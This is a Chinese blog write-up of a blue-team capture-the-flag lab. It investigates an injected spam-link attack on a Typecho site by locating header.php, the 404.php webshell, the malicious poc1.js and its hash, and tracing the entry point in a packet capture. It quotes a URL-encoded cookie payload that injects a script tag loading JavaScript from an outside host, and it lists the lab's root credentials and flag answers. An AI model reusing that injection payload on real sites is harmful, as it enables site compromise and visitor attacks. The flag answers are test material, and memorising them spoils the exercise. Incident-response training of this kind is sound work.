---
title: 【玄机靶场】第五章 linux实战-黑链
date: 2025-09-05
categories:
  - 靶场
  - 蓝队
image: images/45.webp
---
# 简介
服务器场景操作系统 Linux
服务器账号密码 root xjty110pora 端口 2222
任务环境说明
注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！
应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查
# flag1
**找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}**
```php
/var/www/html
```
文件拉出来分析：
![Pasted image 20250402092201](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402092201.png)
```
flag{header.php}
```
# flag2
**webshell的绝对路径 flag{xxxx/xxx/xxx/xxx/}**
直接使用D盾进行扫描即可！
扫描出来一个一个分析一下。发现404.php为后门文件。
![Pasted image 20250402092553](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402092553.png)
![Pasted image 20250402092532](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402092532.png)
```
flag{/var/www/html/usr/themes/default/404.php}
```
# flag3
**黑客注入黑链文件的 md5 md5sum file flag{md5}**
D盾扫描出来的pool.js文件也很可疑
![Pasted image 20250402093130](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402093130.png)
![Pasted image 20250402093239](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402093239.png)
确定poc1.js为黑链文件。
```
PS D:\html> certutil -hashfile .\poc1.js MD5
```
![Pasted image 20250402093103](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402093103.png)
```
flag{10c18029294fdec7b6ddab76d9367c14}
```
# flag4
**攻击入口是哪里？url请求路径，最后面加/ flag{/xxxx.xxx/xxxx/x/}**
分析流量包
在 Wireshark 的过滤器中输入 `http` 以过滤出所有 HTTP 请求和响应。这将使我们能够专注于与 Web 流量相关的数据包，当然这里也可以直接尝试定位文件“poc1.js”，因为题三我们已经找到了黑客注入的文件是“poc1.js”，所以我们可以尝试查找一下相关的数据包；
```
http contains "poc1.js"
```
![Pasted image 20250402094329](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402094329.png)
![Pasted image 20250402094338](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402094338.png)
那我们右键追踪http进行分析；
![Pasted image 20250402094353](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402094353.png)
```
 Cookie: 09f1f9758c26c309477b55f3a4bac8de__typecho_remember_url=http%3A%2F%2Fxxx.xxx.com%2F%22%3E%3C%2Fa%3E%3Cscript%2Fsrc%3Dhttp%3A%2F%2F192.168.20.130%2Fpoc.js%3E%3C%2Fscript%3E%3Ca%2Fhref%3D%22%23
```
这里的 Cookie 包含了一段注入的 JavaScript 代码，显然是黑链攻击的一部分。
url解码为：
![Pasted image 20250402094431](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250402094431.png)
请求和响应中包含的信息表明`http://192.168.20.130/index.php/archives/1/`页面是黑链攻击的入口，通过Cookie注入的JavaScript代码引入了`poc1.js`文件，从而执行了恶意操作。这个URL是反弹的`poc1.js`的原因在于其作为恶意代码的载体和入口。
```
flag{/index.php/archives/1/}
```